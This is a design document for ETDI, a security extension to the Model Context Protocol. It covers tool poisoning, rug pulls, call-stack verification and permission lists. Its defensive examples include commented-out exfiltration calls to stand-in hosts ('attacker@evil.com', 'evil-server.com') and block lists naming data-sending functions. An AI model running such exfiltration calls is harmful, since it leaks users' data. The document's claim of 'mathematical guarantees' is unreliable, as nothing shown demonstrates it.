# ETDI Security Model

## Security Vulnerabilities Addressed

ETDI addresses two critical security vulnerabilities in the Model Context Protocol (MCP):

### 1. Tool Poisoning

Tool Poisoning occurs when a malicious actor deploys a tool that masquerades as a legitimate, trusted tool. This attack vector is mitigated through:

- Cryptographic verification of tool identity
- Provider authentication through OAuth 2.0
- Immutable versioned definitions
- Explicit permission management

### 2. Rug Pull Attacks

Rug Pull attacks occur when a tool's functionality or permission requirements are maliciously altered after initial user approval. This is prevented through:

- Version control and change detection
- Cryptographic integrity verification
- Permission scope validation
- OAuth token binding

## Security Architecture

### 1. Cryptographic Identity

- Public/private key pairs for tool providers
- Digital signatures for tool definitions
- OAuth 2.0 integration for centralized identity management

### 2. Version Control

- Semantic versioning for tool definitions
- Immutable versioned definitions
- Change detection and re-approval triggers

### 3. Permission Management

- Explicit permission declarations
- Scope-based access control
- Permission change detection
- User consent management

### 4. Call Stack Verification

Call stack verification is ETDI's real-time attack prevention system that monitors and controls the chain of tool calls to prevent sophisticated security attacks including privilege escalation, unauthorized function calls, and deep call chain attacks.

#### 4.1 Attack Vectors Prevented

**Privilege Escalation Attacks**
- Low-privilege tools attempting to call high-privilege functions
- Read-only tools trying to invoke write operations
- User-level tools attempting to call admin functions

**Deep Call Chain Attacks**
- Infinite recursion attacks that can crash systems
- Complex nested call chains that obscure malicious behavior
- Stack overflow attacks through excessive call depth

**Unauthorized Function Calls**
- Tools calling functions outside their permitted scope
- Data processing tools attempting to call communication APIs
- Workflow tools trying to access admin functions

**Circular Call Attacks**
- Infinite loops between tools that can consume resources
- Circular dependencies that can deadlock systems
- Self-referential calls that bypass security checks

#### 4.2 Implementation Mechanisms

**Real-Time Call Stack Tracking**
```python
class CallStackVerifier:
    def verify_call(self, tool: ETDIToolDefinition, session_id: str):
        current_stack = self.get_call_stack(session_id)
        
        # Check call depth limits
        if len(current_stack) >= tool.call_stack_constraints.max_depth:
            raise SecurityViolation("Call depth exceeded")
        
        # Verify allowed callees
        if tool.call_stack_constraints.allowed_callees:
            if tool.id not in tool.call_stack_constraints.allowed_callees:
                raise SecurityViolation("Tool not in allowed callees list")
        
        # Check blocked callees
        if tool.id in tool.call_stack_constraints.blocked_callees:
            raise SecurityViolation("Tool is in blocked callees list")
        
        # Detect circular calls
        if tool.id in [call.tool_id for call in current_stack]:
            raise SecurityViolation("Circular call detected")
```

**Declarative Security Policies**
```python
@app.tool(etdi=True,
          etdi_permissions=['banking:read'],
          etdi_max_call_depth=2,                    # Maximum call depth
          etdi_allowed_callees=['log_action'],      # Only these functions allowed
          etdi_blocked_callees=['transfer_money'])  # These functions blocked
def get_account_balance(account_id: str) -> str:
    # Tool can only call log_action, cannot call transfer_money
    log_action(f"Balance check for {account_id}")
    return f"Balance: $1000"
```

#### 4.3 Security Constraints

**Call Depth Limiting**
- Maximum call depth configurable per tool (default: 10)
- Prevents infinite recursion and complex attack chains
- Enforced at runtime before each function call

**Allowed Callees Lists**
- Whitelist of functions a tool is permitted to call
- Empty list means tool cannot call any other functions
- Enforced through runtime interception

**Blocked Callees Lists**
- Blacklist of functions a tool is explicitly forbidden to call
- Takes precedence over allowed callees
- Used to prevent specific dangerous operations

**Circular Call Prevention**
- Detects when a tool tries to call itself directly or indirectly
- Prevents infinite loops and resource exhaustion
- Maintains call history per session

#### 4.4 Real-World Attack Prevention Examples

**Banking Security Example**
```python
# Secure banking server with call stack protection
@app.tool(etdi=True,
          etdi_permissions=['banking:read'],
          etdi_max_call_depth=2,
          etdi_blocked_callees=['transfer_money', 'admin_functions'])
def get_account_balance(account_id: str) -> str:
    balance = database.get_balance(account_id)
    
    # ATTACK ATTEMPT: Malicious payload tries to transfer money
    # transfer_money(account_id, "attacker_account", balance)  # ❌ BLOCKED
    
    return f"Balance: ${balance}"

# RESULT: Read functions cannot escalate to write functions
```

**Data Exfiltration Prevention**
```python
@app.tool(etdi=True,
          etdi_permissions=['data:process'],
          etdi_blocked_callees=['send_email', 'upload_file', 'external_api'])
def process_sensitive_data(data: str) -> str:
    processed = analyze_data(data)
    
    # ATTACK ATTEMPT: Try to exfiltrate processed data
    # send_email("attacker@evil.com", processed)  # ❌ BLOCKED
    # upload_file("evil-server.com", processed)   # ❌ BLOCKED
    
    return "Data processed securely"

# RESULT: Data processing tools cannot exfiltrate data
```

**Admin Function Protection**
```python
@app.tool(etdi=True,
          etdi_permissions=['admin:execute'],
          etdi_max_call_depth=1,                    # No nested calls allowed
          etdi_allowed_callees=[],                  # Cannot call anything
          etdi_blocked_callees=['*'])               # Block everything
def admin_reset_system() -> str:
    # Ultra-secure admin function - completely isolated
    return "System reset completed"

# RESULT: Admin functions are completely isolated
```

#### 4.5 Configuration Strategies

**Strict Security (High-Risk Operations)**
```python
etdi_max_call_depth=1          # No nested calls
etdi_allowed_callees=[]        # Cannot call anything
etdi_blocked_callees=['*']     # Block everything
```

**Controlled Workflow (Business Logic)**
```python
etdi_max_call_depth=5                    # Allow workflow chains
etdi_allowed_callees=['step1', 'step2', 'step3', 'log_action']
etdi_blocked_callees=['admin_functions', 'external_apis']
```

**Read-Only Operations (Data Access)**
```python
etdi_max_call_depth=3                    # Limited depth
etdi_allowed_callees=['validate', 'log', 'format']
etdi_blocked_callees=['write', 'delete', 'modify', 'send']
```

#### 4.6 Security Event Generation

Call stack verification generates security events for monitoring and alerting:

```python
# Events emitted when attacks are detected
emit_security_event(
    EventType.CALL_DEPTH_EXCEEDED,
    "CallStackVerifier",
    "high",
    threat_type="privilege_escalation",
    details={
        "tool_id": "malicious_tool",
        "current_depth": 5,
        "max_allowed": 3,
        "call_stack": ["tool1", "tool2", "tool3", "tool4", "malicious_tool"]
    }
)

emit_security_event(
    EventType.PRIVILEGE_ESCALATION_DETECTED,
    "CallStackVerifier",
    "critical",
    threat_type="unauthorized_call",
    details={
        "caller_tool": "read_only_tool",
        "attempted_callee": "admin_delete_function",
        "caller_permissions": ["data:read"],
        "required_permissions": ["admin:delete"]
    }
)
```

#### 4.7 Performance Considerations

- **Minimal Overhead**: Call stack verification adds <1ms per tool call
- **Memory Efficient**: Call stacks are lightweight and session-scoped
- **Scalable**: Verification scales linearly with call depth
- **Configurable**: Can be disabled for performance-critical scenarios

#### 4.8 Integration with MCP

Call stack verification integrates seamlessly with existing MCP infrastructure:

- **Backward Compatible**: Non-ETDI tools work without call stack constraints
- **Opt-in Security**: Call stack verification is enabled per tool via decorators
- **Runtime Enforcement**: Verification happens during actual tool execution
- **Event Integration**: Security events integrate with existing monitoring systems

This comprehensive call stack verification system provides mathematical guarantees that tools cannot exceed their defined security boundaries, preventing entire classes of attacks that are impossible to detect with traditional security approaches.

## Implementation Security

### 1. Key Management

- Secure key storage
- Key rotation procedures
- Revocation mechanisms

### 2. Token Security

- JWT token validation
- Scope verification
- Token revocation
- Expiration handling

### 3. Client Security

- Secure storage of approvals
- Integrity verification
- Permission enforcement
- Change detection

## Best Practices

1. Always verify tool signatures
2. Implement proper key management
3. Use OAuth 2.0 for identity management
4. Enforce strict version control
5. Implement proper permission checks
6. Monitor for suspicious changes
7. Maintain audit logs
8. Regular security reviews

## Security Levels

ETDI supports three security levels:

1. **Basic**: Simple cryptographic verification
2. **Enhanced**: OAuth 2.0 integration
3. **Strict**: Full security features with additional controls

## Threat Model

### Attack Vectors

1. Tool Poisoning
   - Impersonation
   - Metadata spoofing
   - Provider identity theft

2. Rug Pull Attacks
   - Silent modifications
   - Permission escalation
   - Functionality changes

### Mitigation Strategies

1. Tool Poisoning Prevention
   - Cryptographic verification
   - Provider authentication
   - Metadata validation

2. Rug Pull Prevention
   - Version control
   - Change detection
   - Permission validation

## Security Testing

1. Penetration testing
2. Vulnerability scanning
3. Security code review
4. Integration testing
5. Compliance verification 